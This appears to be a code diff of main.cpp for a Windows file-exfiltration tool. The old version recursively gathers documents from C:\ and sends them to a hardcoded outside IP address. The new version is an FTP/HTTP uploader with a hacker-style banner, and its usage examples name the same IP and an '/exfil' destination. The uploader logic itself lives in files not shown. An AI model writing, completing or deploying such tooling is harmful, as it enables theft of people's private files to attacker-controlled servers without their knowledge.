@@ -1,42 +1,84 @@
 #include <iostream>
-#include <thread>
+#include <string>
 #include <vector>
-#include "gatherer.h"
-#include "exfiltrator.h"
+#include <cstdlib>         // For EXIT_*
+#include "FtpUploader.h"   // Our FTP logic
+#include "HttpUploader.h"  // Our HTTP logic
+#include "Utils.h"         // Our helper utilities
+//g++ -o ftp_uploader.exe main.cpp FtpUploader.cpp Utils.cpp HttpUploader.cpp -lwininet -lshlwapi
+int main(int argc, char* argv[])
+{
+    // Print a banner akin to the original code
+    std::cout << R"(
+ _____     _ _ _____                 ___         
+|  |  |___|_| |_   _|___ ___ ___ ___|  _|___ ___ 
+|  |  | -_| | | | | |  _| .'|   |_ -|  _| -_|  _|
+ \___/|___|_|_| |_| |_| |__,|_|_|___|_| |___|_|  
+             v1.0 | FTP/HTTP | by :)
+)" << "\n";
 
-int main() {
-    std::string directoryPath = "C:\\";                  // Starting directory
-    std::string targetURL = "http://64.94.85.32:7000"; // Replace with your server URL
-    int threadCount = std::thread::hardware_concurrency();    // Use all available cores
-//g++ -o Data9.exe main.cpp exfiltrator.cpp gatherer.cpp -Iinclude -static -std=c++17 -lws2_32 -pthread
-    std::cout << "[INFO] Starting recursive file exfiltration process with " << threadCount << " threads..." << std::endl;
+    // We expect:
+    //   argv[1] = "ftp" or "http"
+    //   argv[2] = username
+    //   argv[3] = password
+    //   argv[4] = server (for FTP or HTTP host)
+    //   argv[5] = localPath
+    //   argv[6] = remotePath (FTP directory or HTTP endpoint)
+    //   argv[7] = [optional] comma-separated patterns
 
-    // Start file gathering
-    std::vector<std::string> textExtensions = {".txt", ".doc", ".docx"};
-    std::vector<std::string> imageExtensions = {".png", ".jpg", ".jpeg"};
-    std::vector<std::string> videoExtensions = {".mp4", ".avi", ".mkv"};
-
-    std::thread gatherer(gatherFiles, directoryPath, textExtensions);
-
-    // Start exfiltration threads
-    std::vector<std::thread> workers;
-    for (int i = 0; i < threadCount; ++i) {
-        workers.emplace_back(exfiltrateFile, targetURL);
+    if (argc < 7) {
+        std::cout << "[!] Usage:\n"
+                  << "    " << argv[0] << " <ftp|http> <username> <password> <server> <localPath> <remotePath> [patterns]\n\n"
+                  << "Examples:\n"
+                  << "    " << argv[0] << " ftp user pass 64.94.85.32 C:\\myfiles /upload *.exe,*.txt\n"
+                  << "    " << argv[0] << " ftp user pass ftp.example.com C:\\secret /exfil\n"
+                  << "    " << argv[0] << " http user pass 192.168.1.100 C:\\myfiles /upload *.pdf\n\n"
+                  << "Notes:\n"
+                  << " - If you omit [patterns], all files in <localPath> are uploaded.\n"
+                  << " - Patterns are comma-separated (e.g. \"*.txt,*.pdf\").\n"
+                  << " - For FTP, if your server is on port 21, simply supply the IP/host (e.g. 64.94.85.32).\n"
+                  << " - For HTTP, we assume port 80 (unsecured). Provide the IP or domain.\n";
+        return EXIT_FAILURE;
     }
 
-    gatherer.join();
-    {
-        std::lock_guard<std::mutex> lock(exfilMutex);
-        doneGathering = true;
-    }
-    cv.notify_all();
+    // Parse arguments
+    std::string mode        = argv[1];   // "ftp" or "http"
+    std::string username    = argv[2];
+    std::string password    = argv[3];
+    std::string server      = argv[4];   // e.g., "ftp.example.com" or "192.168.1.100"
+    std::string localPath   = argv[5];   // e.g., "C:\\Users\\User\\files"
+    std::string remotePath  = argv[6];   // e.g., "/upload" or "/endpoint"
 
-    for (auto& worker : workers) {
-        if (worker.joinable()) {
-            worker.join();
+    // Optional 7th param: comma-separated list of patterns (e.g. "*.xlsx,*.xls,*.docx")
+    std::vector<std::string> includePatterns;
+    if (argc >= 8) {
+        includePatterns = splitString(argv[7], ',');
+    }
+
+    if (includePatterns.empty()) {
+        std::cout << "[!] No file patterns provided; all files in localPath will be uploaded.\n";
+    }
+
+    // Perform the appropriate upload
+    try {
+        if (mode == "ftp") {
+            std::cout << "[*] Using FTP mode.\n";
+            uploadFTP(username, password, server, localPath, remotePath, includePatterns);
+            std::cout << "\n[*] File(s) uploaded successfully via FTP.\n";
         }
+        else if (mode == "http") {
+            std::cout << "[*] Using HTTP mode.\n";
+            uploadHTTP(username, password, server, localPath, remotePath, includePatterns);
+            std::cout << "\n[*] File(s) uploaded successfully via HTTP.\n";
+        }
+        else {
+            std::cerr << "[-] Unknown mode: " << mode << ". Must be 'ftp' or 'http'.\n";
+            return EXIT_FAILURE;
+        }
+    } catch (const std::exception& ex) {
+        std::cerr << "[-] Upload error: " << ex.what() << "\n";
+        return EXIT_FAILURE;
     }
 
-    std::cout << "[INFO] File exfiltration process completed." << std::endl;
-    return 0;
+    return EXIT_SUCCESS;
 }
